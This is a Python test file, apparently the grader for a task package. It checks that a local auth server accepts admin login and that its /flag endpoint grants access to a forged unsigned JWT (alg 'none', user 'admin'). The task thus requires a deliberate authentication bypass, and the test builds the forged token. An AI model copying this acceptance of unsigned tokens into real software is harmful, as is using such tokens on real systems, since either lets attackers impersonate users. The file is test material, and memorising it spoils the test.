# test_final_state.py
import os
import requests
import base64
import json
import time

def test_auth_server_binary_exists():
    binary_path = "/home/user/auth_server"
    assert os.path.exists(binary_path), f"The binary {binary_path} does not exist."
    assert os.access(binary_path, os.X_OK), f"The binary {binary_path} is not executable."

def test_login_endpoint():
    url = "http://127.0.0.1:8080/login"
    data = {
        "username": "admin",
        "password": "SuperSecretP4ss!"
    }

    try:
        response = requests.post(url, data=data, timeout=5)
    except requests.exceptions.RequestException as e:
        assert False, f"Failed to connect to the server at {url}: {e}"

    assert response.status_code == 200, f"Expected status code 200, got {response.status_code}. Response: {response.text}"
    assert "Authorization" in response.headers, "Response is missing the 'Authorization' header."

def test_flag_endpoint_vulnerability():
    url = "http://127.0.0.1:8080/flag"

    header = {"alg": "none", "typ": "JWT"}
    payload = {"user": "admin"}

    def b64url_encode(data):
        return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

    jwt_token = f"{b64url_encode(header)}.{b64url_encode(payload)}."

    headers = {
        "Authorization": f"Bearer {jwt_token}"
    }

    try:
        # Also try without "Bearer " just in case the implementation expects the raw token
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code != 200 or "ACCESS_GRANTED" not in response.text:
            headers_raw = {"Authorization": jwt_token}
            response = requests.get(url, headers=headers_raw, timeout=5)
    except requests.exceptions.RequestException as e:
        assert False, f"Failed to connect to the server at {url}: {e}"

    assert response.status_code == 200, f"Expected status code 200, got {response.status_code}. Response: {response.text}"
    assert "ACCESS_GRANTED" in response.text, f"Expected 'ACCESS_GRANTED' in response, got: {response.text}"